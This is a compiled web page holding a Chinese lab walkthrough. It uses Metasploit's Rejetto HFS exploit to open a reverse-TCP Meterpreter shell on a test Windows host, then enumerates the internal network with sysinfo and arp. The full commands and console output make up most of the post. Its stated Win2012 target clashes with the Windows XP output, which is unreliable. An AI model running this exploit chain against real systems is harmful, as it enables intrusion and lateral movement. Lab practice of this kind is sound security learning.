import{i as e,r as t,s as n,t as r}from"./app-DRouFNlp.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-05-02-024-%E4%BD%BF%E7%94%A8Metasploit%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%9A%84%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90.html","title":"使用Metasploit获取目标的控制权限","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"使用Metasploit获取目标的控制权限","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"使用Metasploit获取目标的控制权限","lock":"need"},"git":{"updatedTime":1777467059000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"b75b6e641e607b7f05676a6a564dbee261378911","time":1777467059000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-05-02-024-使用Metasploit获取目标的控制权限.md"}`),a={name:`2022-05-02-024-使用Metasploit获取目标的控制权限.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="使用metasploit获取目标的控制权限" tabindex="-1"><a class="header-anchor" href="#使用metasploit获取目标的控制权限"><span>使用Metasploit获取目标的控制权限</span></a></h1><p>攻击机： Kali 192.168.175.128</p><p>靶机： Win2012 R2 192.168.175.130</p><p>在上一篇《<a href="https://blog.csdn.net/l1028386804/article/details/86567192" target="_blank" rel="noopener noreferrer">对威胁建模(附加搭建CVE:2014-6287漏洞环境</a>)》中，我们确定了目标系统的漏洞和Metasploit的可利用模块，接下来我们就真正获取目标的控制权限。</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msfconsole</span>
<span class="line">use exploit/windows/http/rejetto_hfs_exec</span>
<span class="line">set RHOST 192.168.175.130</span>
<span class="line">set RPORT 8080</span>
<span class="line">set payload windows/meterpreter/reverse_tcp</span>
<span class="line">set LHOST 192.168.175.128</span>
<span class="line">exploit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>具体操作如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf5 &gt; use exploit/windows/http/rejetto_hfs_exec </span>
<span class="line">msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set RHOST 192.168.175.130</span>
<span class="line">RHOST =&gt; 192.168.175.130</span>
<span class="line">msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set RPORT 8080</span>
<span class="line">RPORT =&gt; 8080</span>
<span class="line">msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set payload windows/meterpreter/reverse_tcp</span>
<span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span>
<span class="line">msf5 exploit(windows/http/rejetto_hfs_exec) &gt; set LHOST 192.168.175.128</span>
<span class="line">LHOST =&gt; 192.168.175.128</span>
<span class="line">msf5 exploit(windows/http/rejetto_hfs_exec) &gt; show options</span>
<span class="line"></span>
<span class="line">Module options (exploit/windows/http/rejetto_hfs_exec):</span>
<span class="line"></span>
<span class="line">   Name       Current Setting  Required  Description</span>
<span class="line">   ----       ---------------  --------  -----------</span>
<span class="line">   HTTPDELAY  10               no        Seconds to wait before terminating web server</span>
<span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span>
<span class="line">   RHOSTS     192.168.175.130  yes       The target address range or CIDR identifier</span>
<span class="line">   RPORT      8080             yes       The target port (TCP)</span>
<span class="line">   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span>
<span class="line">   SRVPORT    8080             yes       The local port to listen on.</span>
<span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span>
<span class="line">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span>
<span class="line">   TARGETURI  /                yes       The path of the web application</span>
<span class="line">   URIPATH                     no        The URI to use for this exploit (default is random)</span>
<span class="line">   VHOST                       no        HTTP server virtual host</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options (windows/meterpreter/reverse_tcp):</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span>
<span class="line">   LHOST     192.168.175.128  yes       The listen address (an interface may be specified)</span>
<span class="line">   LPORT     4444             yes       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   0   Automatic</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf5 exploit(windows/http/rejetto_hfs_exec) &gt; exploit</span>
<span class="line"></span>
<span class="line">[*] Started reverse TCP handler on 192.168.175.128:4444 </span>
<span class="line">[*] Using URL: http://0.0.0.0:8080/OHqKAjyg9dj9u</span>
<span class="line">[*] Local IP: http://192.168.175.128:8080/OHqKAjyg9dj9u</span>
<span class="line">[*] Server started.</span>
<span class="line">[*] Sending a malicious request to /</span>
<span class="line">[*] Payload request received: /OHqKAjyg9dj9u</span>
<span class="line">[*] Sending stage (179779 bytes) to 192.168.175.130</span>
<span class="line">[*] Meterpreter session 1 opened (192.168.175.128:4444 -&gt; 192.168.175.130:1091) at 2019-01-23 11:32:15 +0800</span>
<span class="line">[!] Tried to delete %TEMP%\\OmpsEelxzVs.vbs, unknown result</span>
<span class="line">[*] Server stopped.</span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行完后，我们就获得了目标主机的控制权。</p><p>接下来，我们看看内网中有没有其他主机，如下所示：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; sysinfo</span>
<span class="line">Computer        : LIUYAZHUANG</span>
<span class="line">OS              : Windows XP (Build 2600, Service Pack 3).</span>
<span class="line">Architecture    : x86</span>
<span class="line">System Language : zh_CN</span>
<span class="line">Domain          : WORKGROUP</span>
<span class="line">Logged On Users : 2</span>
<span class="line">Meterpreter     : x86/windows</span>
<span class="line">meterpreter &gt; </span>
<span class="line">meterpreter &gt; arp</span>
<span class="line"></span>
<span class="line">ARP cache</span>
<span class="line">=========</span>
<span class="line"></span>
<span class="line">    IP address       MAC address        Interface</span>
<span class="line">    ----------       -----------        ---------</span>
<span class="line">    192.168.175.2    00:50:56:e7:f5:30  2</span>
<span class="line">    192.168.175.128  00:0c:29:68:65:5b  2</span>
<span class="line">    192.168.175.131  00:0c:29:cf:f6:ac  2</span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到内网中有一台192.168.175.131的主机。</p><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,14)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};